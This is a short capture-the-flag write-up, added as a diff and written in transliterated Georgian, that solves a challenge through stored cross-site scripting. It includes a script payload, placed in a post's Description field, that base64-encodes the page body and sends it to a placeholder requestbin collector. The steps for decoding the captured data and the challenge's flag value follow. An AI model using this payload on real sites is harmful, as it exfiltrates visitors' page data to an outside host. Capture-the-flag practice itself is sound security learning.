@@ -1,0 +1,11 @@
+shevdivart saitze da vregistrirdebit
+mere gadavdivart post-ebshi da vachert New Post
+Title - rac gvinda
+Description - 
+<script> var exfil = document.getElementsByTagName("body")[0].innerHTML; 
+window.location.href="requestbin link" + btoa(exfil); </script>
+mere vimaxsovrebt da vusvebt
+amis shemdeg requesbinze modis message da pirveliveshi GET-is mere rac aris magas vakopirebt
+gvwirdeba base64 decoder, chavapastot da /rac aris win movushalot
+decrypt gavuketot da sul boloshi chamovwiot
+CTF{20c96587af01d6a1a03708883259343b7bd0fd85d74eb65c1e3dbc669e0d09ca}  
